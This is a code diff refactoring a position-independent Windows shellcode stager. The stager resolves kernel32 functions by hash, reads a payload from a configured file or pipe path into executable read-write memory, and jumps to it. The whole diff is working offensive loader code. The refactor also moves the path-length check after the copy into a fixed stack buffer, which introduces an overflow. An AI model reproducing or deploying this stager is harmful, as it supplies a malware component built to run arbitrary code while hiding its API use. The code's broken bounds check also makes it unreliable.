@@ -45,6 +45,14 @@ typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
 	unsigned long flAllocationType, unsigned long flProtect);
 typedef void(PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);
 
+struct resolved_funcs {
+	fn_CreateFileA create_file;
+	fn_ReadFile read_file;
+	fn_CloseHandle close_handle;
+	fn_VirtualAlloc virtual_alloc;
+	fn_ExitProcess exit_process;
+};
+
 __asm__(".section .config,\"aw\"\n"
 	".globl stager_pipe_windows_config\n"
 	"stager_pipe_windows_config:\n"
@@ -68,70 +76,113 @@ static int read_all(fn_ReadFile rf, void *h, void *buf, pic_u32 count)
 }
 
 PIC_ENTRY
-void _start(void)
+static void resolve_funcs(struct resolved_funcs *funcs)
 {
 	PIC_SELF_RELOCATE();
 
-	fn_CreateFileA pCreateFileA = (fn_CreateFileA)pic_resolve(
+	funcs->create_file = (fn_CreateFileA)pic_resolve(
 		HASH_KERNEL32_DLL, HASH_CREATE_FILE_A);
-	fn_ReadFile pReadFile =
+	funcs->read_file =
 		(fn_ReadFile)pic_resolve(HASH_KERNEL32_DLL, HASH_READ_FILE);
-	fn_CloseHandle pCloseHandle = (fn_CloseHandle)pic_resolve(
+	funcs->close_handle = (fn_CloseHandle)pic_resolve(
 		HASH_KERNEL32_DLL, HASH_CLOSE_HANDLE);
-	fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
+	funcs->virtual_alloc = (fn_VirtualAlloc)pic_resolve(
 		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
-	fn_ExitProcess pExitProcess = (fn_ExitProcess)pic_resolve(
+	funcs->exit_process = (fn_ExitProcess)pic_resolve(
 		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);
+}
 
-	if (!pCreateFileA || !pReadFile || !pCloseHandle || !pVirtualAlloc ||
-		!pExitProcess)
-		for (;;)
-			;
-
+PIC_TEXT
+static pic_u16 load_path(char *path)
+{
 	extern char stager_pipe_windows_config[]
 		__attribute__((visibility("hidden")));
 	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_windows_config;
 
 	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
-	if (path_len == 0 || path_len >= PATH_MAX_LEN)
-		pExitProcess(1);
-
-	char path[PATH_MAX_LEN];
 	for (pic_u16 i = 0; i < path_len; i++)
 		path[i] = (char)cfg[2 + i];
 	path[path_len] = '\0';
+	return path_len;
+}
 
-	void *h = pCreateFileA(
+PIC_TEXT
+static void *open_input(const struct resolved_funcs *funcs, const char *path)
+{
+	return funcs->create_file(
 		path, GENERIC_READ, 0, PIC_NULL, OPEN_EXISTING, 0, PIC_NULL);
-	if (h == (void *)-1)
-		pExitProcess(1);
+}
 
+PIC_TEXT
+static pic_u32 read_payload_size(const struct resolved_funcs *funcs, void *h)
+{
 	pic_u8 size_buf[4];
-	if (!read_all(pReadFile, h, size_buf, 4)) {
-		pCloseHandle(h);
-		pExitProcess(1);
-	}
-	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
+	if (!read_all(funcs->read_file, h, size_buf, 4))
+		return 0;
+	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
 		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
-	if (size == 0 || size > 0x10000000) {
-		pCloseHandle(h);
-		pExitProcess(1);
-	}
+}
 
-	void *mem = pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
+PIC_TEXT
+static void *alloc_payload(const struct resolved_funcs *funcs, pic_u32 size)
+{
+	return funcs->virtual_alloc(PIC_NULL, (pic_uintptr)size,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!mem) {
-		pCloseHandle(h);
-		pExitProcess(1);
+}
+
+PIC_ENTRY
+static void *load_payload(const struct resolved_funcs *funcs, const char *path)
+{
+	void *h;
+	pic_u32 size;
+	void *mem;
+
+	h = open_input(funcs, path);
+	if (h == (void *)-1)
+		return PIC_NULL;
+
+	size = read_payload_size(funcs, h);
+	if (size == 0 || size > 0x10000000) {
+		funcs->close_handle(h);
+		return PIC_NULL;
 	}
 
-	if (!read_all(pReadFile, h, mem, size)) {
-		pCloseHandle(h);
-		pExitProcess(1);
+	mem = alloc_payload(funcs, size);
+	if (!mem) {
+		funcs->close_handle(h);
+		return PIC_NULL;
 	}
-	pCloseHandle(h);
+
+	if (!read_all(funcs->read_file, h, mem, size)) {
+		funcs->close_handle(h);
+		return PIC_NULL;
+	}
+	funcs->close_handle(h);
+	return mem;
+}
+
+PIC_ENTRY
+void _start(void)
+{
+	struct resolved_funcs funcs;
+	char path[PATH_MAX_LEN];
+	pic_u16 path_len;
+	void *mem;
+
+	resolve_funcs(&funcs);
+	if (!funcs.create_file || !funcs.read_file || !funcs.close_handle ||
+		!funcs.virtual_alloc || !funcs.exit_process)
+		for (;;)
+			;
+
+	path_len = load_path(path);
+	if (path_len == 0 || path_len >= PATH_MAX_LEN)
+		funcs.exit_process(1);
+
+	mem = load_payload(&funcs, path);
+	if (!mem)
+		funcs.exit_process(1);
 
 	((void (*)(void))mem)();
-
-	pExitProcess(0);
+	funcs.exit_process(0);
 }
